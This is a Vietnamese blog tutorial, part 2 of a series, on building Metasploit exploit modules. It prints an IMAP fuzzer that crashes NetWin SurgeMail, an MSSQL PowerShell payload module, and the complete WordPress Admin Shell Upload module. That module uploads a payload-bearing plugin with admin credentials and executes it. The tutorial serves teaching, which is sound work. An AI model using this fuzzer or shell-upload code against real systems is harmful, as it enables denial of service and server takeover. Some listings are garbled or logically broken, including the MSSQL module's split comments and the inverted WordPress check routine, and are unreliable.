![](https://images.viblo.asia/c74ff2b3-bb74-4a77-a3fb-afb4e607d250.jpg)

Tiếp nối những gì đã tìm hiểu được ở [phần 1 ](https://viblo.asia/p/ky-thuat-khai-thac-lo-hong-bao-mat-web-tren-metasploit-framework-p1-4dbZNJw8ZYM).  Hôm  nay chúng ta sẽ tiếp tục cùng nhau phân tích một mã khai thác đơn giản trên Metasploit Framework .

## 6. Phân tích module thực hiện fuzzing

Fuzzing là một kĩ thuật dùng để phát hiện lỗi phần mềm bằng cách tự động hoặc bán tự động. Fuzzing sẽ liên tục thử các dữ liệu đầu vào cho các chương trình với các dữ liệu được tạo ra ngẫu nhiên và không hợp lệ như: dữ liệu quá dài, dữ liệu quá ngắn, các giá trị đặc biệt, các kí tự đặc biệt, … Quá trình này nhằm phát hiện các lỗi mà chương trình chưa kiểm soát. Từ đó phát hiện ra các điểm yếu có thể tấn công của ứng dụng.  

Trong thực tế đối với việc kiểm thử các ứng dụng web, khi sử dụng sẽ thường xuyên gặp các ứng dụng có module MSF nào khả dụng. Khi gặp các tình huống như vậy, người kiểm thử sẽ thử cố gắng phát hiện ra các lỗ hổng và tự tạo ra các module khai thác cho chúng. Thông thường để phát hiện ra các lỗ hổng này có thể sử dụng kĩ thuật “fuzzing”. 

Khi thực hiện kĩ thuật này, người tấn công sẽ liên tục gửi những dữ liệu ngẫu nhiên, không hợp lệ, bất ngờ hoặc không đúng theo định dạng ứng dụng yêu cầu. Sau đó dựa vào các trường hợp ngoại lệ hoặc các sự cố có thể xảy ra với ứng dụng. Người kiểm thử sẽ có thể tìm thấy lỗ hổng và phát triển mã khai thác cho lỗ hổng này. 

Trong ví dụ dưới đây sẽ thực hiện việc “fuzzing” để xác định lỗ hổng trong ứng dụng “*NetWin SurgeMail 3.8k4-4*”. Lỗ hổng này được xác định bởi “Matteo Memelli (ryujin)” và có sẵn tại  https://exploit-db.com/exploits/5259. 

Lỗ hổng này khiến cho ứng dụng không thể sử lý các lệnh “LIST” quá dài dẫn đến tràn bộ đệm cho phép kẻ tấn công thực thi mã từ xa.
Trước khi viết mã khai thác cần xác định nơi mà lỗ hổng tồn tại trong ứng dụng. Đây là một đoạn mã đơn giản để thực hiện “fuzzer” cho giao thức IMAP:

```ruby
require 'msf/core' 
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Imap 
include Msf::Auxiliary::Dos        
def initialize                
	super(                       
		'Name'           => 'Simple IMAP Fuzzer',                        
		'Description'    => %q{                                                
		An example of how to build a simple IMAP fuzzer.                                                
		Account IMAP credentials are required in this fuzzer.},                        
		'Author'         => ['ryujin'],                        
		'License'        => MSF_LICENSE,                        
		'Version'        => '$Revision: 1$'                
	)        
end
def fuzz_str() 
	return Rex::Text.rand_text_alphanumeric(rand(1024))
end       
def run()                
	srand(0)                
	while (true) 
		connected = connect_login()                       
	if not connected     
	print_status("Host is not responding - this is G00D ;)")
	break 
	end
	print_status("Generating fuzzed data...") 
	fuzzed = fuzz_str() 
	print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length) 
	req = '0002 LIST () "/' + fuzzed + '" "PWNED"' + "\r\n" 
	print_status(req)
	res = raw_send_recv(req)                                
		if !res.nil?                        
			print_status(res)                                
		else                
			print_status("Server crashed, no response")
			break                  
		end
						disconnect() 
                       end
                  end
            end 
```
                   
Module fuzzing trên bắt đầu bằng việc sử dụng hai module mixin là* Msf::Exploit::Remote::Imap* và *Msf::Auxiliary::Dos*. Module IMAP cung cấp các chức năng đăng nhập cần thiết để sử dụng IMAP. Và module DOS thực tạo “payload” tấn công.

Hàm fuzz_str được viết nhằm mục đích tạo ra chuỗi ngẫu nhiên cho việc “fuzzing” với độ dài tối đa là 1024 bit. Việc “fuzzing” sẽ bắt đầu bằng việc kết nối và đăng nhập và dịch vụ từ xa. Trong quá trình lặp lại các hành động trên sẽ luôn kiểm tra việc kết nối đến dịch vụ. Nếu trong trường hợp không thể kết nối được dịch vụ hoặc máy chủ phản hồi không như bình thường thì chương trình sẽ xác định được việc gây ra ngoại lệ hoặc lỗi không mong muốn cho dịch vụ. Đoạn code “*fuzzed = fuzzstr()*” sẽ sử dụng hàm* fuzzstr()* để tạo chuỗi ngẫu nhiên. Sau đó chuỗi ngẫu nhiên này sẽ được nối thêm vào lệnh LIST. Và sau đó được gửi đi.

Khi chương trình không còn nhận được phản hồi từ máy chủ sẽ in ra cửa sổ lệnh thông báo “Server crashed, no response” và dừng việc “fuzzing”. Sau đó có thể phân tích payload được gửi lên để phát hiện ra lỗi tràn bộ đệm và ghi đè mã thực thi lên các thanh ghi và thực thi mã từ xa.

### 6.1. Sử dụng module mixins trong viết mã khai thác

Về cơ bản, ruby là một ngôn ngữ lập trình đơn kế thừa và một lớp chỉ có thể kế thừa từ một lớp cha. Vậy nên ruby sinh ra một module có tên là mixin, nhằm hỗ trợ việc kế thừa từ những lớp khác.

Khi viết mã khai thác, msf hỗ trợ nhiều module mixin khác nhau. Việc kế thừa các module trong mã khai thác là cần thiết, giúp cho mã khai thác có thể tái sử dụng các module có sẵn. Dưới đây là một số module thường được sử dụng: 

*Exploit::Remote::Tcp* : đây là module cung cấp các tùy chọn và phương thức với TCP.

 - Cần khai báo các giá trị biến RHOST, RPORT, ConnectTimeout
 - Cung cấp hai phương thức connect(), disconnect() để kết nối và ngắt kết nối với máy tấn công.
Exploit::Remote::DCERPC : được kế thứa từ module TCP mixin và hỗ trợ thêm nhiều phương thức và tùy chọn khác.
 - dcerpc_handle()
 - dcerpc_bind()
 - dcerpc_call()
 
 Ngoài ra Metasploit Mixins còn hỗ trợ rất nhiều các module khác nhau giúp hỗ trợ việc viết mã khai thác được dễ dàng hơn. Người sử dụng có thể tùy ý sử dụng theo ý tưởng viết mã khai thác của mình:
	
- Capture – nghe lén các gói mạng
- Lorcon – gửi dữ liệu các frame wifi dang thô
- MSSQL – Giao tiếp với các máy chủ Microsoft SQL
- KernelMode - khai thác lỗi kernel
- SEH - xử lý ngoại lệ có cấu trúc
- NDMP - giao thức sao lưu mạng
- FTP – kết nối với máy chủ FTP
- FTPServer - tạo máy chủ FTP

Dưới đây là một đoạn mã khai thác sử dụng mixin và được xây dựng để khai thác lỗ hổng thực thi mã từ xa trên một số phiên bản “sql server 2008”. Module này được kế thừa từ module “*msf/exploit/remote/MSSQL*”:

```ruby
require 'msf/core'#
require core libraries
	class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking# reliable exploit ranking
	include Msf::Exploit::Remote::MSSQL# 
	include the mssql.rb library
	def initialize(info = {})
		super(update_info(info, 'Name' => 'Microsoft SQL Server PowerShell Payload',
 		'Description' => % q {
  This module will deliver our payload through Microsoft PowerShell using MSSQL based attack vectors.
}, 
		'Author' => ['David Kennedy "ReL1K" <kennedyd013[at]gmail.com>'],
		'License' => MSF_LICENSE, 
		'Version' => '$Revision: 8771 $', 
		'References' => [['URL', 'http://www.secmaniac.com']], 
		'Platform' => 'win', #target only windows 
		'Targets' => [
		['
		Automatic', {}], #automatic targeting
		],
 		'DefaultTarget' => 0)) 
register_options(
	[
	OptBool.new('UsePowerShell', [false, "Use PowerShell as payload delivery method instead", true
	]), #default to PowerShell
	]) 
end
	def exploit 
		handler# call the Metasploit handler disconnect# after handler 
	disconnect 
	end 
end
```

Trước khi viết mã cho phần thực thi, chương trình cần khai báo một số giá  trị cần thiết 
- Các giá trị “Name”, “Description”, “Author”, “License”, “Version”, “References” để khai báo các thông tin mô tả cơ bản về module.
- Nền tảng xảy ra lỗ hổng tiếp tục được khai báo ở giá trị “Platform”. Ở đây là hệ điều hành “window” với mục tiêu là giá trị các phiên bản của window. Được xác định tự động.
- Một tham số mới được khai báo ở đây là “UsePowerShell” được sử dụng như là phần chính của mã khai thác và được khai báo với giá trị bằng “true”.
- Tiếp theo là lệnh “handler” trong hàm exploit để kiểm soát các kết nối giữa máy tấn công và máy mục tiêu.

Nhiệm vụ chính của mã khai thác trên là kế thừa lại module khai thác “*Msf::Exploit::Remote::MSSQL*” và đặt giá trị mặc định cho tham số “UsePowerShell” luôn là “true”.

## 7. Phân tích Module có sẵn

Phần này sẽ trình bày phân tích và xây dựng một module thực hiện thực thi mã từ xa trên nền tảng Wordpress với quyền admin. Module này sẽ tạo ra một plugin cho Wordpress, đóng gói payload vào đó và tải nó lên một máy chủ chạy dịch vụ Wordpress để thực thi mã từ xa.
Về cơ bản, MSF đã hỗ trợ người sử dụng các chức năng cơ bản để thao tác với Wordpress như đăng nhập, lưu trữ phiên đăng nhập và các thao tác cơ bản. 

Người sử dụng chỉ cần kế thừa các chức năng này và thực hiện mã khai thác.

Đầu tiên chương trình cần kế thừa hai module là:
*Msf::Exploit::FileDropper* : Giúp kế thừa sử dụng các thao tác với file.
*Msf::Exploit::Remote::HTTP::Wordpress* : Kế thừa sử dụng thao tác với wordpress. Thực hiện khai báo các module để sử dụng các thông tin cơ bản của module:

```ruby 
require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Admin Shell Upload',
      'Description'     => %q{
          This module will generate a plugin, pack the payload into it
          and upload it to a server running WordPress providing valid
          admin credentials are used.
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        ['rastating' # Metasploit module
        ],
      'DisclosureDate'  => 'Feb 21 2015',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['WordPress', {}]],
      'DefaultTarget'   => 0
    )) 
    register_options(
      [
        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
      ])
end
```
Sử dụng đoạn code sau để thực hiện việc đăng nhập vào Wordpress với tài khoản và mật khẩu:

```ruby
def check
    cookie = wordpress_login(username, password)
    if cookie.nil?
    	store_valid_credential(user: username, private: password, proof: cookie)
     	return CheckCode::Safe
    end

    CheckCode::Appears
  End
def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end
```
Hàm sau dùng để tạo plugin và đóng gói plugin cho wordpress. Các thông tin được khai báo trong plugin này đều được tạo ra ngẫu nhiên với REX: 

```ruby
def generate_plugin(plugin_name, payload_name)
    plugin_script = %Q{<?php
/**
 * Plugin Name: #{plugin_name}
 * Version: #{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(2)}
 * Author: #{Rex::Text.rand_text_alpha(10)}
 * Author URI: http://#{Rex::Text.rand_text_alpha(10)}.com
 * License: GPL2
 */
?>}

    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file("#{plugin_name}/#{plugin_name}.php", plugin_script)
    zip.add_file("#{plugin_name}/#{payload_name}.php", payload.encoded)
    zip
  end
```
Sau khi các file cần thiết và file chứa payload được tạo ra. Module Rex:Zip sẽ đóng gói plugin thành một file nén định dạng zip để gửi lên server:

Hàm exploit là sẽ phần thân chính của module. Thực hiện các bước để kiểm tra và tạo phiên đăng nhập vào wordpress. Sau đó tạo ra plugin và thực hiện việc tải plugin đó lên máy chủ dịch vụ wordpress:

```ruby
def exploit
    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?

    print_status("Authenticating with WordPress using #{username}:#{password}...")
    cookie = wordpress_login(username, password)
    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?
    print_good("Authenticated with WordPress")
    store_valid_credential(user: username, private: password, proof: cookie)

    print_status("Preparing payload...")
    plugin_name = Rex::Text.rand_text_alpha(10)
    payload_name = "#{Rex::Text.rand_text_alpha(10)}"
    payload_uri = normalize_uri(wordpress_url_plugins, plugin_name, "#{payload_name}.php")
    zip = generate_plugin(plugin_name, payload_name)

    print_status("Uploading payload...")
    uploaded = wordpress_upload_plugin(plugin_name, zip.pack, cookie)
    fail_with(Failure::UnexpectedReply, 'Failed to upload the payload') unless uploaded

    print_status("Executing the payload at #{payload_uri}...")
    register_files_for_cleanup("#{payload_name}.php")
    register_files_for_cleanup("#{plugin_name}.php")
    register_dir_for_cleanup("../#{plugin_name}")
    send_request_cgi({ 'uri' => payload_uri, 'method' => 'GET' }, 5)
end
```

Cuối cùng sau khi được module khai thác hoàn chỉnh. Lưu chúng vào thư mục exploit/unix/webapp/ và sử dụng: 

![](https://images.viblo.asia/3ad10623-5a7c-4f0c-8bf7-6b844395812e.png)

Thành công mở kết nối thực thi mã từ xa trên máy chủ chạy dịch vụ wordpress.


## 8. Tổng kết

Qua đây chúng ta đã phần nào hiểu được về các thành phần kiến trúc của Metasploit Framework và cũng nói về lý thuyết, phân tích một số module khai thác lỗ hổng bảo mật có sẵn trong thư viện. Ở phần sau sẽ từng bước phân tích và xây dựng hoàn chỉnh một module khai thác lỗ hổng bảo mật web trong thực tế.

Tài liệu tham khảo :

https://github.com/rapid7/metasploit-framework/wiki

https://www.offensive-security.com/metasploit-unleashed/

Thank to @doandinhlinh